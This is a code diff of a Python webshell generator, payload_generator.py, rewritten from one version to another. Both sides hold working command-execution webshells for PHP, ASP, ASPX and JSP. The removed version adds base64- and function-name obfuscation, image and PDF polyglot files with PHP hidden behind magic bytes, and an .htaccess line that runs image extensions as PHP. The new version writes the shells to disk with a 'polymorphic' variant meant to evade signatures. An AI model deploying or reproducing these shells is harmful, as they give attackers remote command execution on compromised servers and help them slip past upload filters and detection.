@@ -1,179 +1,154 @@
 """
-payload_generator.py — Multi-language & Polymorphic Payload Generator
-Supports PHP, ASP, ASPX, JSP webshells + obfuscated/polyglot variants.
+Payload Generator Module
+Creates various webshell payloads for different server technologies
 """
 
-import base64
+import os
 import random
 import string
-from typing import Dict, Optional
-
+from typing import Dict
 
 class PayloadGenerator:
-    """Generate webshell payloads for various server-side languages."""
-
-    # ------------------------------------------------------------------ #
-    #  Raw payload templates                                               #
-    # ------------------------------------------------------------------ #
-
-    _PHP_SIMPLE = b"<?php system($_GET['cmd']); ?>"
-
-    _PHP_ADVANCED = b"""<?php
+    """Generate webshells for different server environments"""
+    
+    def __init__(self, output_dir: str = "payloads"):
+        self.output_dir = output_dir
+        os.makedirs(output_dir, exist_ok=True)
+        os.makedirs(os.path.join(output_dir, "polymorphic"), exist_ok=True)
+    
+    def generate_all_payloads(self) -> Dict[str, str]:
+        """Generate all payload types and return their paths"""
+        payloads = {}
+        
+        payloads['php'] = self.generate_php_shell()
+        payloads['asp'] = self.generate_asp_shell()
+        payloads['aspx'] = self.generate_aspx_shell()
+        payloads['jsp'] = self.generate_jsp_shell()
+        payloads['php_poly'] = self.generate_polymorphic_php()
+        
+        return payloads
+    
+    def generate_php_shell(self) -> str:
+        """Generate standard PHP webshell"""
+        code = '''<?php
 if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
     $cmd = ($_REQUEST['cmd']);
-    $output = shell_exec($cmd . ' 2>&1');
-    echo "<pre>$output</pre>";
+    system($cmd);
+    echo "</pre>";
+    die;
 }
-?>"""
-
-    _PHP_OBFUSCATED_TEMPLATE = (
-        '<?php '
-        '$f="{func}";'
-        '$f($_GET["{param}"]);'
-        '?>'
-    )
-
-    _PHP_BASE64 = (
-        b"<?php eval(base64_decode('"
-        + base64.b64encode(b"system($_GET['cmd']);")
-        + b"')); ?>"
-    )
-
-    _PHP_POLYGLOT_JPEG = (
-        b"\xff\xd8\xff\xe0"          # JPEG SOI + APP0 marker
-        b"\x00\x10JFIF\x00\x01\x01"  # JFIF header stub
-        b"\x00\x00\x01\x00\x01\x00\x00"
-        b"<?php system($_GET['cmd']); ?>"
-    )
-
-    _PHP_POLYGLOT_GIF = b"GIF89a<?php system($_GET['cmd']); ?>"
-    _PHP_POLYGLOT_PDF = b"%PDF-1.4\n<?php system($_GET['cmd']); ?>"
-
-    _ASP_SIMPLE = b'<%eval request("cmd")%>'
-
-    _ASPX_SIMPLE = b"""<%@ Page Language="C#" %>
-<%
-    string cmd = Request.QueryString["cmd"];
-    if (!string.IsNullOrEmpty(cmd))
+?>'''
+        path = os.path.join(self.output_dir, "shell.php")
+        with open(path, 'w') as f:
+            f.write(code)
+        return path
+    
+    def generate_asp_shell(self) -> str:
+        """Generate ASP webshell"""
+        code = '''<%
+If Request.QueryString("cmd") <> "" Then
+    Dim oScript
+    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+    Dim oScriptNet
+    Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+    Dim oFileSys
+    Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+    Dim oFile
+    Set oFile = oFileSys.CreateTextFile(Server.MapPath(".") & "\\output.txt", True)
+    
+    Dim szCMD, szTempFile
+    szCMD = Request.QueryString("cmd")
+    szTempFile = Server.MapPath(".") & "\\output.txt"
+    
+    Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+    
+    Dim szOutput
+    szOutput = oFileSys.OpenTextFile(szTempFile, 1, False, 0).ReadAll
+    Response.Write "<pre>" & szOutput & "</pre>"
+End If
+%>'''
+        path = os.path.join(self.output_dir, "shell.asp")
+        with open(path, 'w') as f:
+            f.write(code)
+        return path
+    
+    def generate_aspx_shell(self) -> str:
+        """Generate ASPX webshell"""
+        code = '''<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+    void Page_Load(object sender, EventArgs e)
     {
-        var proc = System.Diagnostics.Process.Start(
-            new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd)
-            { RedirectStandardOutput = true, UseShellExecute = false });
-        Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+        if (Request.QueryString["cmd"] != null)
+        {
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.Start();
+            string output = p.StandardOutput.ReadToEnd();
+            p.WaitForExit();
+            Response.Write("<pre>" + output + "</pre>");
+        }
     }
-%>"""
-
-    _JSP_SIMPLE = b"""<%@ page import="java.io.*" %>
+</script>'''
+        path = os.path.join(self.output_dir, "shell.aspx")
+        with open(path, 'w') as f:
+            f.write(code)
+        return path
+    
+    def generate_jsp_shell(self) -> str:
+        """Generate JSP webshell"""
+        code = '''<%@ page import="java.io.*" %>
 <%
     String cmd = request.getParameter("cmd");
     if (cmd != null) {
-        Process proc = Runtime.getRuntime().exec(cmd);
-        InputStream is = proc.getInputStream();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+        Process p = Runtime.getRuntime().exec(cmd);
+        InputStream in = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
         String line;
         out.println("<pre>");
-        while ((line = reader.readLine()) != null) out.println(line);
+        while ((line = reader.readLine()) != null) {
+            out.println(line);
+        }
         out.println("</pre>");
+        reader.close();
     }
-%>"""
-
-    _HTACCESS_PAYLOAD = b"AddType application/x-httpd-php .jpg .png .gif .txt\n"
-
-    # Magic byte signatures
-    _MAGIC_BYTES = {
-        "jpg":  b"\xff\xd8\xff\xe0\x00\x10JFIF\x00",
-        "png":  b"\x89PNG\r\n\x1a\n",
-        "gif":  b"GIF89a",
-        "pdf":  b"%PDF-1.4\n",
-        "bmp":  b"BM",
-        "zip":  b"PK\x03\x04",
-    }
-
-    # ------------------------------------------------------------------ #
-    #  Public API                                                          #
-    # ------------------------------------------------------------------ #
-
-    def get(
-        self,
-        lang: str = "php",
-        variant: str = "simple",
-        magic_prefix: Optional[str] = None,
-    ) -> bytes:
-        """
-        Return payload bytes.
-
-        Args:
-            lang:         php | asp | aspx | jsp | htaccess
-            variant:      simple | advanced | obfuscated | base64 |
-                          polyglot_jpeg | polyglot_gif | polyglot_pdf
-            magic_prefix: Optional image type to prepend magic bytes (jpg/png/gif/pdf)
-        """
-        lang = lang.lower()
-        variant = variant.lower()
-
-        payload = self._build(lang, variant)
-
-        if magic_prefix and magic_prefix in self._MAGIC_BYTES:
-            payload = self._MAGIC_BYTES[magic_prefix] + payload
-
-        return payload
-
-    def all_variants(self, lang: str = "php") -> Dict[str, bytes]:
-        """Return all variants for a language as {name: bytes}."""
-        variants = ["simple", "advanced", "obfuscated", "base64",
-                    "polyglot_jpeg", "polyglot_gif", "polyglot_pdf"]
-        return {v: self._build(lang, v) for v in variants}
-
-    def command_param(self, lang: str = "php", variant: str = "simple") -> str:
-        """Return the GET/POST parameter name used by this payload."""
-        if lang == "asp":
-            return "cmd"
-        if lang == "aspx":
-            return "cmd"
-        if lang == "jsp":
-            return "cmd"
-        if variant == "obfuscated":
-            return self._obfuscated_param()  # fixed seed so it's deterministic per run
-        return "cmd"
-
-    # ------------------------------------------------------------------ #
-    #  Internal builders                                                   #
-    # ------------------------------------------------------------------ #
-
-    def _build(self, lang: str, variant: str) -> bytes:
-        if lang == "asp":
-            return self._ASP_SIMPLE
-        if lang == "aspx":
-            return self._ASPX_SIMPLE
-        if lang == "jsp":
-            return self._JSP_SIMPLE
-        if lang == "htaccess":
-            return self._HTACCESS_PAYLOAD
-
-        # Default: PHP
-        if variant == "advanced":
-            return self._PHP_ADVANCED
-        if variant == "base64":
-            return self._PHP_BASE64
-        if variant == "obfuscated":
-            return self._obfuscated_php().encode()
-        if variant == "polyglot_jpeg":
-            return self._PHP_POLYGLOT_JPEG
-        if variant == "polyglot_gif":
-            return self._PHP_POLYGLOT_GIF
-        if variant == "polyglot_pdf":
-            return self._PHP_POLYGLOT_PDF
-
-        return self._PHP_SIMPLE  # simple (default)
-
-    def _obfuscated_php(self) -> str:
-        """Generate a simple variable-function obfuscation."""
-        funcs = ["system", "shell_exec", "passthru", "exec", "popen"]
-        func = random.choice(funcs)
-        param = self._obfuscated_param()
-        return self._PHP_OBFUSCATED_TEMPLATE.format(func=func, param=param)
-
+%>'''
+        path = os.path.join(self.output_dir, "shell.jsp")
+        with open(path, 'w') as f:
+            f.write(code)
+        return path
+    
+    def generate_polymorphic_php(self) -> str:
+        """Generate obfuscated PHP shell to evade signatures"""
+        # Generate random variable names
+        var1 = ''.join(random.choices(string.ascii_lowercase, k=8))
+        var2 = ''.join(random.choices(string.ascii_lowercase, k=8))
+        var3 = ''.join(random.choices(string.ascii_lowercase, k=8))
+        
+        code = f'''<?php
+${var1} = $_REQUEST;
+${var2} = 'sys'.'tem';
+if(isset(${var1}['cmd'])){{
+    ${var3} = ${var1}['cmd'];
+    ${var2}(${var3});
+}}
+?>'''
+        path = os.path.join(self.output_dir, "polymorphic", "shell_poly.php")
+        with open(path, 'w') as f:
+            f.write(code)
+        return path
+    
     @staticmethod
-    def _obfuscated_param() -> str:
-        random.seed(42)  # deterministic so command_param() matches
-        return "".join(random.choices(string.ascii_lowercase, k=6))
+    def get_payload_info() -> Dict[str, str]:
+        """Return information about available payloads"""
+        return {
+            'php': 'PHP webshell - works on Apache/Nginx with PHP',
+            'asp': 'Classic ASP shell - IIS servers',
+            'aspx': 'ASP.NET shell - IIS with .NET framework',
+            'jsp': 'Java Server Pages shell - Tomcat/JBoss',
+            'php_poly': 'Polymorphic PHP - evades basic signatures'
+        }
